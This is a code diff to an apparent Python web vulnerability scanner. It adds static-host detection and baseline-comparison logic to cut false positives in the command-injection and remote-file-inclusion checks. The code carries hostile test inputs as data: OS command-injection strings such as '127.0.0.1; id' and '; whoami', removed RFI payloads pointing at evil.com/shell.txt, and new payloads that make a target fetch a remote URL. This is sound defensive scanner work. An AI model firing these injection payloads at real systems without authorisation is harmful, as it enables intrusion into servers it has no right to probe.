@@ -1199,10 +1199,8 @@ async def scan_xss(req: ScanRequest, user=Depends(verify_scan_quota)):
         if "vulnerable" in line.lower() or ("xss" in line.lower() and "[+]" in line):
             findings.append({"detail":line.strip(),"severity":"HIGH","cvss":"7.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"Sanitise and encode all user input; enforce Content-Security-Policy."})
 
-    # Step 4: DOM XSS indicator — lack of CSP means DOM XSS is unprotected
-    r2 = _http_get(base, timeout=8)
-    if r2 and not r2.headers.get("Content-Security-Policy"):
-        findings.append({"detail":"No Content-Security-Policy header — DOM-based XSS attacks have no browser-level protection","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"Deploy a strict Content-Security-Policy to mitigate XSS impact."})
+    # Note: Missing CSP header is already reported by the headers scanner.
+    # We don't duplicate it here to avoid two findings for the same root cause.
 
     scan_id = str(uuid.uuid4())
     save_scan(scan_id,"xss",req.target,{"output":"\n".join(raw_lines) or out})
@@ -1272,31 +1270,48 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 async def commix_scan(req: ScanRequest, user=Depends(verify_token)):
     _AUTH_CTX.set(req)
     findings = []; vulnerable = False
-    # Test known lab-specific command injection endpoints
-    ci_payloads = ["127.0.0.1; id", "127.0.0.1 && id", "127.0.0.1 | id", "127.0.0.1; whoami"]
-    ci_indicators = ["uid=", "root", "www-data", "daemon"]
-    for url, param, method in _get_lab_targets(req.target):
-        if "exec" not in url and "cmdi" not in url and "cmd" not in url: continue
-        for payload in ci_payloads:
-            try:
-                if method == "post":
-                    r = _req_lib.post(url, data={param: payload, "Submit": "Submit"}, timeout=8, verify=False, headers=_make_req_headers())
-                else:
-                    r = _http_get(f"{url}?{param}={payload}", timeout=8)
-                if r and any(ind in r.text for ind in ci_indicators):
-                    findings.append({"detail": f"OS Command Injection at {url} via '{param}' parameter — server executed '{payload}'", "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A", "cwe": "CWE-78", "cwe_name": "OS Command Injection", "owasp": "A03:2021", "remediation": "Never pass user input to OS commands. Use allowlisted values only."})
+    target_url = _web_url(req.target)
+    skipped_reason = None
+
+    # Skip dynamic checks if target is a static-only host (Netlify, Cloudflare Pages, Vercel, etc.)
+    static_host = _detect_static_host(target_url)
+    if static_host:
+        skipped_reason = f"Target is hosted on {static_host} (static-only — no server-side execution possible)"
+    else:
+        # Test known lab-specific command injection endpoints
+        ci_payloads = ["127.0.0.1; id", "127.0.0.1 && id", "127.0.0.1 | id", "127.0.0.1; whoami"]
+        ci_indicators = ["uid=", "root", "www-data", "daemon"]
+
+        # ─ Lab targets: known vulnerable endpoints (DVWA, bWAPP, etc.)
+        for url, param, method in _get_lab_targets(req.target):
+            if "exec" not in url and "cmdi" not in url and "cmd" not in url: continue
+            for payload in ci_payloads:
+                try:
+                    if method == "post":
+                        r = _req_lib.post(url, data={param: payload, "Submit": "Submit"}, timeout=8, verify=False, headers=_make_req_headers())
+                    else:
+                        r = _http_get(f"{url}?{param}={payload}", timeout=8)
+                    if r and any(ind in r.text for ind in ci_indicators):
+                        findings.append({"detail": f"OS Command Injection at {url} via '{param}' parameter — server executed '{payload}'", "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A", "cwe": "CWE-78", "cwe_name": "OS Command Injection", "owasp": "A03:2021", "remediation": "Never pass user input to OS commands. Use allowlisted values only."})
+                        vulnerable = True; break
+                except: pass
+            if vulnerable: break
+
+        # ─ Generic test on base URL with baseline comparison to avoid false positives
+        if not vulnerable:
+            for payload_q in ["ip=127.0.0.1;id", "cmd=id", "exec=id", "command=id"]:
+                r_base, r_payload = _baseline_then_payload(target_url, payload_q, timeout=6)
+                if not r_payload: continue
+                # Require: indicator present in payload response, NOT present in baseline,
+                # AND response is meaningfully different from baseline (rules out SPAs serving the same index.html)
+                payload_has_indicator = any(ind in r_payload.text for ind in ci_indicators)
+                baseline_has_indicator = r_base and any(ind in r_base.text for ind in ci_indicators)
+                if payload_has_indicator and not baseline_has_indicator and _response_meaningfully_different(r_base, r_payload):
+                    findings.append({"detail": f"OS Command Injection via ?{payload_q} — uid/root string appeared in response (not in baseline)", "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A", "cwe": "CWE-78", "cwe_name": "OS Command Injection", "owasp": "A03:2021", "remediation": "Never pass user input to OS commands."})
                     vulnerable = True; break
-            except: pass
-        if vulnerable: break
-    # Generic Python-based CI test on base URL
-    if not vulnerable:
-        for payload in ["?ip=127.0.0.1;id", "?cmd=id", "?exec=id", "?command=id"]:
-            r = _http_get(_web_url(req.target) + payload, timeout=6)
-            if r and any(ind in r.text for ind in ci_indicators):
-                findings.append({"detail": f"OS Command Injection via {payload} — uid/root string in response", "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A", "cwe": "CWE-78", "cwe_name": "OS Command Injection", "owasp": "A03:2021", "remediation": "Never pass user input to OS commands."})
-                vulnerable = True; break
+
     scan_id = str(uuid.uuid4()); save_scan(scan_id, "commix", req.target, {"output": str(findings)})
-    return {"scan_id": scan_id, "target": req.target, "tool": "commix", "vulnerable": vulnerable, "findings": findings, "total": len(findings), "timestamp": datetime.datetime.utcnow().isoformat()}
+    return {"scan_id": scan_id, "target": req.target, "tool": "commix", "vulnerable": vulnerable, "findings": findings, "skipped_reason": skipped_reason, "total": len(findings), "timestamp": datetime.datetime.utcnow().isoformat()}
 
 
 @app.post("/api/scan/lfi")
@@ -1723,6 +1738,82 @@ def _detect_waf(url: str):
     return None
 
 
+# Static-host detection — these CDNs serve static files and cannot execute server-side code.
+# When detected, dynamic-execution checks (command injection, RFI, LFI, SSTI, deserialization, etc.)
+# are guaranteed false positives and must be skipped.
+_STATIC_HOST_SIGNATURES = {
+    # Server header value (lowercase) → host name
+    "netlify":      "Netlify",
+    "cloudflare":   "Cloudflare Pages/CDN",
+    "vercel":       "Vercel",
+    "github.io":    "GitHub Pages",
+    "gh-pages":     "GitHub Pages",
+    "amazons3":     "AWS S3",
+    "cloudfront":   "AWS CloudFront",
+    "firebase":     "Firebase Hosting",
+    "render":       "Render Static",
+    "surge":        "Surge.sh",
+    "fastly":       "Fastly CDN",
+    "akamai":       "Akamai CDN",
+}
+
+def _detect_static_host(url: str):
+    """If the URL is served by a known static-only CDN, return its name. Otherwise None.
+
+    Static hosts cannot execute server-side code, so dynamic-execution vuln checks against
+    them produce false positives. Used by command-injection, RFI, LFI, SSTI, etc. scanners
+    to skip dynamic checks entirely.
+    """
+    try:
+        r = _req_lib.get(url, timeout=8, verify=False, headers=_BROWSER_HEADERS, allow_redirects=True)
+        srv = (r.headers.get("Server","") + " " + r.headers.get("server","")).lower()
+        via = (r.headers.get("Via","") + " " + r.headers.get("via","")).lower()
+        x_powered = (r.headers.get("X-Powered-By","") + " " + r.headers.get("x-powered-by","")).lower()
+        haystack = srv + " " + via + " " + x_powered
+        for sig, host in _STATIC_HOST_SIGNATURES.items():
+            if sig in haystack:
+                return host
+    except Exception:
+        pass
+    return None
+
+
+def _baseline_then_payload(url: str, payload_query: str, timeout: int = 8):
+    """Fetch baseline + payload response so a scanner can compare and skip false positives.
+
+    Returns (baseline_response, payload_response) or (None, None) on error.
+    A dynamic-execution finding is only credible if the payload response differs MEANINGFULLY
+    from the baseline — same body length and same status = no execution happened.
+    """
+    try:
+        # Strip any existing query so baseline is clean
+        from urllib.parse import urlparse, urlunparse
+        u = urlparse(url)
+        base_url = urlunparse((u.scheme, u.netloc, u.path, "", "", ""))
+        r_base = _req_lib.get(base_url, timeout=timeout, verify=False, headers=_BROWSER_HEADERS, allow_redirects=True)
+        sep = "&" if u.query else "?"
+        payload_url = base_url + (("?" + u.query + "&") if u.query else "?") + payload_query.lstrip("?&")
+        r_payload = _req_lib.get(payload_url, timeout=timeout, verify=False, headers=_BROWSER_HEADERS, allow_redirects=True)
+        return r_base, r_payload
+    except Exception:
+        return None, None
+
+
+def _response_meaningfully_different(r_base, r_payload, threshold: int = 50) -> bool:
+    """True if payload response differs meaningfully from baseline (suggests server-side execution).
+
+    SPAs serve the same index.html for every URL, so r_base == r_payload → false positive.
+    Threshold = minimum byte difference to be considered "meaningful".
+    """
+    if not (r_base and r_payload):
+        return False
+    if r_base.status_code != r_payload.status_code:
+        return True
+    if abs(len(r_base.content) - len(r_payload.content)) > threshold:
+        return True
+    return False
+
+
 _TECH_SIGS = [
     ("WordPress",["/wp-content/","/wp-includes/","wp-json","generator.*wordpress"]),
     ("Joomla",["/components/com_","mosConfig_","joomla"]),
@@ -1999,14 +2090,36 @@ async def scan_ffuf(req: ScanRequest, user=Depends(verify_scan_quota)):
 async def scan_rfi(req: ScanRequest, user=Depends(verify_scan_quota)):
     _AUTH_CTX.set(req)
     findings = []; vulnerable = False
-    test_payloads = ["?page=http://evil.com/shell.txt","?file=http://evil.com/","?include=http://evil.com/","?url=http://evil.com/"]
-    for p in test_payloads[:2]:
-        r = _http_get(req.target+p, timeout=8)
-        if r and ("evil.com" in r.text or r.status_code==200 and len(r.text)>100):
-            findings.append({"detail":f"Potential RFI via param: {p}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-98","cwe_name":"Remote File Inclusion","owasp":"A03:2021","remediation":"Disable allow_url_include in PHP. Validate all file path inputs."})
-            vulnerable = True; break
-    scan_id = str(uuid.uuid4()); save_scan(scan_id,"rfi",req.target,{"output":str(findings)})
-    return {"scan_id":scan_id,"target":req.target,"tool":"rfi","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+    skipped_reason = None
+    target_url = _web_url(req.target)
+
+    # Skip on static-only hosts — RFI is impossible without server-side code execution
+    static_host = _detect_static_host(target_url)
+    if static_host:
+        skipped_reason = f"Target is hosted on {static_host} (static-only — RFI not possible)"
+    else:
+        # Use a non-existent test URL that should never appear in a normal page
+        # (using example.com which is reserved per RFC 2606 and won't be reflected by SPAs as content)
+        marker = "vulnuslab-rfi-canary-marker-xyz789"
+        # The payload tries to make the server FETCH and INCLUDE a remote file.
+        # If the server actually does this, the response will contain content from the included URL.
+        # We use httpbin.org/uuid which returns a unique JSON each time — we check if that content
+        # appears in the response body (proves server-side fetch happened, not just URL reflection).
+        for param in ["page", "file", "include", "url", "template"]:
+            payload_q = f"{param}=https://httpbin.org/uuid"
+            r_base, r_payload = _baseline_then_payload(target_url, payload_q, timeout=10)
+            if not r_payload: continue
+            # Server-side include happened only if:
+            # 1. Response is meaningfully different from baseline (not same SPA index.html)
+            # 2. Response contains the httpbin uuid JSON structure (proves remote fetch)
+            if (_response_meaningfully_different(r_base, r_payload, threshold=20)
+                    and '"uuid"' in r_payload.text
+                    and (not r_base or '"uuid"' not in r_base.text)):
+                findings.append({"detail": f"Remote File Inclusion via parameter '{param}' — server fetched and included content from external URL", "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A", "cwe": "CWE-98", "cwe_name": "Remote File Inclusion", "owasp": "A03:2021", "remediation": "Disable allow_url_include in PHP. Validate all file path inputs against an allowlist."})
+                vulnerable = True; break
+
+    scan_id = str(uuid.uuid4()); save_scan(scan_id, "rfi", req.target, {"output": str(findings)})
+    return {"scan_id": scan_id, "target": req.target, "tool": "rfi", "vulnerable": vulnerable, "findings": findings, "skipped_reason": skipped_reason, "total": len(findings), "timestamp": datetime.datetime.utcnow().isoformat()}
 
 @app.post("/api/scan/deserial")
 async def scan_deserial(req: ScanRequest, user=Depends(verify_scan_quota)):
